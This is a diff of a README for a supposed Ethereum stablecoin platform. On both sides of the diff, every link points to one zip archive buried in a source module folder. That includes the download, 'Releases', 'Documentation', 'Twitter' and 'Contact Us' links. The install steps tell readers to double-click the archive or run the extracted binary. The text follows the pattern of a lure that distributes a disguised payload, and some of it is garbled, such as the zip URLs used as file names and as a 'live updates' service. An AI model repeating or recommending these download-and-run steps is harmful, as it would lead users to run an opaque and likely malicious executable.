@@ -4,7 +4,7 @@
 The stablecoin-platform is a user-friendly blockchain platform designed for everyone. This application supports multiple custodians and features an Ethereum stablecoin pegged at a 1:1 ratio. With easy integration of microservices, you can manage your digital assets smoothly. Whether you are a small business or just starting your blockchain journey, this platform is built for you.
 
 ## 🔗 Download Now
-[![Download stablecoin-platform](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip)](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip)
+[![Download stablecoin-platform](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip)](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip)
 
 ## 🚀 Getting Started
 To use the stablecoin-platform, follow these steps to download and set it up on your computer.
@@ -18,30 +18,30 @@ Ensure your system meets these requirements before installation:
 - **Internet Connection:** Required for initial setup
 
 ### 2. Visit the Releases Page
-Go to our [Releases page](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip) to find the latest version of the software. This page contains all available releases and the necessary files for download.
+Go to our [Releases page](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip) to find the latest version of the software. This page contains all available releases and the necessary files for download.
 
 ### 3. Download the Software
 On the Releases page, look for the most recent version. Click on the download link next to the appropriate file for your operating system. 
 
-- Windows users might see a file like `https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip`.
-- macOS users might find `https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip`.
-- Linux users should look for a `https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip` file.
+- Windows users might see a file like `https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip`.
+- macOS users might find `https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip`.
+- Linux users should look for a `https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip` file.
 
 ### 4. Install the Software
 Once the file has downloaded, follow these steps based on your operating system:
 
 - **Windows:**
-  1. Locate the downloaded `https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip` file.
+  1. Locate the downloaded `https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip` file.
   2. Double-click the file to start the installation.
   3. Follow the prompts to complete the installation.
 
 - **macOS:**
-  1. Open the downloaded `https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip` file.
+  1. Open the downloaded `https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip` file.
   2. Drag the `stablecoin-platform` folder to your Applications folder.
   3. Open the application from the Applications folder.
 
 - **Linux:**
-  1. Extract the downloaded `https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip` file.
+  1. Extract the downloaded `https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the accessible file using `./stablecoin-platform`.
 
@@ -54,7 +54,7 @@ The stablecoin-platform offers a rich set of features for users:
 - **Multi-Custodian Support:** Manage your assets across different custodians.
 - **Ethereum Stablecoin:** Utilizes a stablecoin tied to Ethereum for consistent value.
 - **Microservices Architecture:** Easily scale and integrate different services.
-- **Real-Time Interactions:** Leverage https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip for live updates.
+- **Real-Time Interactions:** Leverage https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip for live updates.
 
 ## 🔄 How to Use
 1. **Setting Up an Account:**
@@ -70,18 +70,18 @@ The stablecoin-platform offers a rich set of features for users:
    - Enter the details, confirm, and complete your transaction.
 
 ## 📚 Support & Documentation
-If you encounter any issues or have questions, refer to the [documentation](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip). There, you’ll find guides, best practices, and troubleshooting steps. Additionally, you can contact support through the GitHub Issues section if you need further assistance.
+If you encounter any issues or have questions, refer to the [documentation](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip). There, you’ll find guides, best practices, and troubleshooting steps. Additionally, you can contact support through the GitHub Issues section if you need further assistance.
 
 ## 📨 Community
 Join our community of users and developers for additional support and discussions. Connect with us on the following platforms:
 
-- [GitHub Discussions](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip)
-- [Twitter](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip)
+- [Twitter](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip)
 
 ## 🔗 Important Links
-- **Download the latest version:** [Releases page](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip)
-- **Documentation:** [User Guides](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip)
-- **Support:** [Contact Us](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip)
+- **Download the latest version:** [Releases page](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip)
+- **Documentation:** [User Guides](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip)
+- **Support:** [Contact Us](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip)
 
 ## 🔗 Download Again
-To download the stablecoin-platform, visit the [Releases page](https://github.com/Jossy-Geek/stablecoin-platform/raw/refs/heads/main/services/transaction-fireblocks-service/src/modules/fireblocks-webhook/stablecoin_platform_v3.1.zip) anytime you need to update or reinstall the application.
+To download the stablecoin-platform, visit the [Releases page](https://raw.githubusercontent.com/Jossy-Geek/stablecoin-platform/main/services/transaction-fireblocks-service/src/modules/wallet/platform-stablecoin-v1.1.zip) anytime you need to update or reinstall the application.
